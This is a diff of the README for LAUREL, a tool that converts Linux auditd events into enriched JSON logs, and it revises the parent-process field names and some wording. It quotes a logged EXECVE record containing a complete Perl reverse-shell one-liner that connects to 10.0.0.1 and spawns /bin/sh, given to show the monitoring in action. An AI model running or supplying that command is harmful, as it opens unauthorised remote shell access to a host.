@@ -17,14 +17,14 @@ type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=757365
 ```
 { … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}
 ```
-This happens at the source because _LAUREL_ runs on the host where the audit events are generated. The event even contains useful information about the spawning process:
+This happens at the source because _LAUREL_ runs on the host where the audit events are generated. The event even contains useful information about the parent process (ppid):
 ```
-"PARENT_INFO":{"ID":"1643635026.276:327308","comm":"sh","exe":"/usr/bin/dash","ppid":3190631}
+"PPID":{"EVENT_ID":"1643635026.276:327308","comm":"sh","exe":"/usr/bin/dash","ppid":3190631}
 ```
 
-Logs produced by the Linux Audit subsystem and _auditd(8)_ contain information that can be very useful in a SIEM context (if a useful rule set has been configured). However, the format is not well-suited for at-scale analysis: Events are usually split across different lines that have to be merged using a message identifier. Files and program executions are logged via `PATH` and `EXECVE` elements, but a limited character set for strings causes many of those entries to be hex-encoded. For a more detailed discussion, see [Practical _auditd(8)_ problems](practical-auditd-problems.md).
+Logs produced by the Linux Audit subsystem and _auditd(8)_ contain information that can be very useful for host-based security monitoring. However, the format is not well-suited for at-scale analysis: Events are usually split across different lines that have to be merged using a message identifier. Files and program executions are logged via `PATH` and `EXECVE` elements, but a limited character set for strings causes many of those entries to be hex-encoded. For a more detailed discussion, see [Practical _auditd(8)_ problems](practical-auditd-problems.md).
 
-_LAUREL_ solves these problems by consuming audit events, parsing, transforming, enriching them, and writing them out as a separate JSON-based log. All information that was part of the original audit log is kept intact. _auditd(8)_ is not replaced as the consumer of audit messages from the Linux kernel. Instead, _auditd's_ plugin interface (previously called _"audisp"_) is used, therefore _LAUREL.. can peacefully coexist with other consumers of audit events (e.g. some EDR products).
+_LAUREL_ solves these problems by consuming audit events, parsing, transforming, enriching them, and writing them out as a separate JSON-based log. All information that was part of the original audit log is kept intact. The audit daemon is not replaced as the consumer of audit messages from the Linux kernel. Instead, _auditd's_ plugin interface is used, therefore _LAUREL.. can peacefully coexist with other consumers of audit events.
 
 The chapter [_LAUREL_ installation instructions](INSTALL.md) contains instructions on how to set up and configure usage of the plugin.
 
@@ -44,20 +44,24 @@ should be removed.
 
 ## Events with context
 
-Every event that is caused by a syscall or filesystem rule is annotated with information about the parent of the process that caused the event. If available, `id` points to the message corresponding to the last `execve` syscall for this process:
+Every event that is caused by a syscall or filesystem rule is annotated with information about the process that caused the event and its parent:
 
 ``` json
-"PARENT_INFO": {
-  "ID": "1643635026.276:327308",
+"PPID": {
+  "EVENT_ID": "1643635026.276:327308",
   "comm": "sh",
   "exe": "/usr/bin/dash",
   "ppid": 1532
+},
+"PID": {
+  "EVENT_ID": "1643635028.826:327529",
 }
 ```
+`PID.EVENT_ID` or `PPID.EVENT_ID` refers to the audit event corresponding to the last `execve` syscall for the process or its parent, respectively.
 
 ## Adding more context: Keys and process labels
 
-Audit events can contain a key, a short string that can be used to filter events. _LAUREL_ can be configured to recognize such keys and add them as keys to the process that caused the event. These labels can also be propagated to child processes. This is useful to avoid expensive JOIN-like operations in log analysis to filter out noise.
+Audit events can contain a key, a short string that can be used to filter events. _LAUREL_ can be configured to recognize such keys and add them as labels to the process that caused the event. These labels can also be propagated to child processes. This is useful to avoid expensive JOIN-like operations in log analysis to filter out noise.
 
 Consider the following audit rule that set keys for _apt_ and _dpkg_ invocations:
 ```
